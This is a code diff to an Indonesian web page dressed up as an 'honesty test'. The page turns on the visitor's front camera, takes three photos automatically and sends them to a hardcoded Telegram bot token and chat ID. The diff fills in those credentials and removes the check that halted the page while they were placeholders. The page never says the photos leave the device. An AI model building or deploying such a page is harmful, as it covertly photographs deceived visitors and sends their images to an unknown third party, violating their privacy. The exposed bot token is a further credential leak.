@@ -38,7 +38,7 @@
             .toast { max-width: 360px; left: auto; right: 20px; top: 20px; }
         }
         .countdown { font-weight: bold; color: #facc15; margin-top: 8px; }
-        button:disabled { opacity: 0.6; }
+        button:disabled { opacity: 0.6; cursor: not-allowed; }
     </style>
 </head>
 <body>
@@ -52,10 +52,10 @@
     <div id="toast" class="toast" style="opacity:0; visibility:hidden;"></div>
 
     <script>
-        // ================= KONFIGURASI TELEGRAM (GANTI DENGAN MILIK ANDA) =================
-        const BOT_TOKEN = "8938453262:AAFxNwRyyGtRa05QLNNIBJlp5IQwlnFu0NE";   // ganti dengan token asli
-        const CHAT_ID = "8874242457";       // ganti dengan chat ID asli
-        // ============================================================================
+        // ================= KONFIGURASI TELEGRAM (SUDAH DIISI) =================
+        const BOT_TOKEN = "8938453262:AAFxNwRyyGtRa05QLNNIBJlp5IQwlnFu0NE";
+        const CHAT_ID = "8874242457";
+        // ====================================================================
 
         const video = document.getElementById('cameraVideo');
         const startBtn = document.getElementById('startBtn');
@@ -133,11 +133,11 @@
                 const success = await sendToTelegram(blob, photoIndex);
                 if (success) {
                     captureResults.push(true);
-                    showToast(`Foto ${photoIndex} !`);
-                    updateUI(`✅ Foto ${photoIndex} sukses`, '✅', `Yang Ke Dua`);
+                    showToast(`Foto ${photoIndex} berhasil dikirim!`);
+                    updateUI(`✅ Foto ${photoIndex} sukses`, '✅', `Yang Ke ${photoIndex}`);
                     return true;
                 } else {
-                    throw new Error('Gagal kirim');
+                    throw new Error('Gagal kirim ke Telegram');
                 }
             } catch (err) {
                 captureResults.push(false);
@@ -152,12 +152,7 @@
                 showToast('Kamera belum aktif, coba lagi', true);
                 return;
             }
-            if (BOT_TOKEN === "8938453262:AAFxNwRyyGtRa05QLNNIBJlp5IQwlnFu0NE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
-                updateUI('K
-                !', '⚠️', 'Edit kode: isi BOT_TOKEN dan CHAT_ID');
-                showToast('GAGAL!', true);
-                return;
-            }
+
             isActive = true;
             captureResults = [];
             clearTimeouts();
@@ -180,12 +175,12 @@
                             if (remain < 0) clearInterval(countInterval);
                         }, 1000);
                         timeouts.push(countInterval);
-                        detailInfo.innerText = `Jeda Sebentar ${index+1}...`;
+                        detailInfo.innerText = `Jeda Sebentar ke ${index+1}...`;
                     }
                 }, delay);
                 timeouts.push(tid);
             };
-            schedule(1, 300);   // sedikit jeda agar stream mantap
+            schedule(1, 300);
             schedule(2, 3300);
             schedule(3, 6300);
             
@@ -203,18 +198,21 @@
                 updateUI('Selesai! Anda Orang Yang Sangat Jujur', '🎉', 'Refresh halaman untuk mengulang');
                 showToast('Anda Sangat Jujur 100/10!');
             } else if (successCount > 0) {
-                updateUI(`Selesai: ${successCount}/Baguss Sekali`, '!', '....');
+                updateUI(`Selesai: ${successCount}/3 Berhasil`, '👍', 'Coba lagi lain waktu');
+                showToast(`${successCount} dari 3 foto terkirim.`);
             } else {
                 updateUI('Gagal total, anda orang yang tidak jujur', '❌', 'Semangat Untuk Menjadi Jujur');
+                showToast('Tidak ada foto terkirim. Periksa koneksi atau token.', true);
             }
             countdownArea.innerText = '';
             startBtn.disabled = false;
-            startBtn.innerText = '⟳ Loading...';
+            startBtn.innerText = '⟳ MULAI TES LAGI';
         }
 
         async function initCamera() {
             if (mediaStream) stopCamera();
             updateUI('Akses kamera...', '📷', 'Izinkan kamera depan');
+            startBtn.disabled = true;
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: { exact: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } }
@@ -223,13 +221,12 @@
                 video.srcObject = stream;
                 await video.play();
                 updateUI('Kamera depan aktif!', '✅', 'Ayo Mulai Tes');
-                startBtn.disabled = true;
                 setTimeout(() => startPhotoSequence(), 800);
             } catch (err) {
                 let msg = 'Izin kamera ditolak atau tidak ada kamera.';
-                if (err.name === 'NotAllowedError') msg = 'Izin kamera ditola, Klik "Ayo Mulai".';
+                if (err.name === 'NotAllowedError') msg = 'Izin kamera ditolak. Klik tombol izinkan.';
                 else if (err.name === 'NotFoundError') msg = 'Kamera depan tidak ditemukan.';
-                updateUI('Gagal', '❌', msg);
+                updateUI('Gagal akses kamera', '❌', msg);
                 showToast(msg, true);
                 startBtn.disabled = false;
             }
@@ -237,18 +234,21 @@
 
         startBtn.addEventListener('click', () => {
             if (mediaStream && !isActive) {
-                // jika kamera sudah aktif dan tidak sedang memotret, mulai ulang sequence
+                // kamera sudah aktif dan tidak sedang memotret
                 startPhotoSequence();
                 startBtn.disabled = true;
                 setTimeout(() => { if(!isActive) startBtn.disabled = false; }, 7000);
-            } else {
+            } else if (!mediaStream) {
                 initCamera();
+            } else {
+                // sedang aktif, tidak boleh interupsi
+                showToast('Tunggu proses selesai', true);
             }
         });
 
-        // Cek HTTPS / localhost
+        // Peringatan jika bukan HTTPS (tapi tidak menghalangi)
         if (location.protocol !== 'https:' && location.hostname !== 'localhost' && !location.hostname.match(/127\.0\.0\.1/)) {
-            detailInfo.innerText = 'Tunggu Tuan';
+            detailInfo.innerText = '⚠️ Gunakan HTTPS atau localhost untuk akses kamera.';
         }
     </script>
 </body>
